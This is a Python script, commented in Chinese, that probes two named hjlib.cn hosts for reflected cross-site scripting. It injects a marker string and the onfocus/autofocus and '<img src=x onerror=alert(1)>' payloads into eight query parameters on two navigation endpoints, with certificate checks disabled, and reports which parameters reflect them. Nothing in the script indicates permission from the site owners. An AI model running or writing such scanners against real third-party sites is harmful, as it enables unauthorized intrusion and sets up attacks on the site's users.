#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hjlib.cn XSS - 用keyWord/fq参数测试
"""

import requests
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,*/*",
})

TAG = "85f7210c60a00209b3858749ec04d4d6"
marker = f"web_xss_in_tag={TAG} blah="

PARAMS_TO_TEST = ["keyWord", "fq", "filterValue", "filterDynasty", "q", "type", "recordcode", "filterReignTitle"]

TARGETS = [
    ("www.hjlib.cn:8088", "http://www.hjlib.cn:8088"),
    ("thg.hjlib.cn:8088", "http://thg.hjlib.cn:8088"),
]

PATHS = [
    "/navigation/oldNavigationFacet.do",
    "/navigation/newNavigationFacet.do",
]

print("=" * 70)
print("  hjlib.cn XSS标签注入 - keyWord/fq参数测试")
print("=" * 70)

vuln_count = 0

for target_name, base in TARGETS:
    for path in PATHS:
        url = base + path
        print(f"\n{'='*70}")
        print(f"  {target_name}{path}")
        print(f"{'='*70}")

        for param in PARAMS_TO_TEST:
            params = {param: marker}
            try:
                resp = session.get(url, params=params, timeout=10, verify=False)
                body = resp.text

                if TAG in body:
                    idx = body.find(TAG)
                    ctx = body[max(0,idx-80):idx+80]
                    vuln_count += 1
                    print(f"  ✅ [{param}] -> 反射成功!")
                    print(f"     上下文: ...{ctx[:140]}...")
                elif "web_xss_in_tag" in body:
                    vuln_count += 1
                    print(f"  ✅ [{param}] -> 部分反射!")
            except requests.exceptions.Timeout:
                print(f"  ⏱️  [{param}] 超时")
            except Exception as e:
                print(f"  ❌ [{param}] {e}")

            time.sleep(0.3)

        # 测试 onfocus
        onfocus = '" onfocus=alert(1) autofocus="'
        for param in PARAMS_TO_TEST:
            params = {param: onfocus}
            try:
                resp = session.get(url, params=params, timeout=10, verify=False)
                if "onfocus" in resp.text and "alert" in resp.text:
                    idx = resp.text.find("onfocus")
                    ctx = resp.text[max(0,idx-60):idx+80]
                    vuln_count += 1
                    print(f"  ✅ [{param}] onfocus事件注入!")
                    print(f"     上下文: ...{ctx[:140]}...")
            except:
                pass
            time.sleep(0.3)

        # 测试 img onerror
        img_payload = '<img src=x onerror=alert(1)>'
        for param in PARAMS_TO_TEST:
            params = {param: img_payload}
            try:
                resp = session.get(url, params=params, timeout=10, verify=False)
                if "<img" in resp.text and "onerror" in resp.text:
                    idx = resp.text.find("<img")
                    ctx = resp.text[max(0,idx-40):idx+80]
                    if "onerror" in ctx:
                        vuln_count += 1
                        print(f"  ✅ [{param}] img onerror注入!")
                        print(f"     上下文: ...{ctx[:140]}...")
            except:
                pass
            time.sleep(0.3)

print(f"\n{'='*70}")
print(f"  测试完成: {vuln_count} 个存在漏洞")
print(f"{'='*70}")
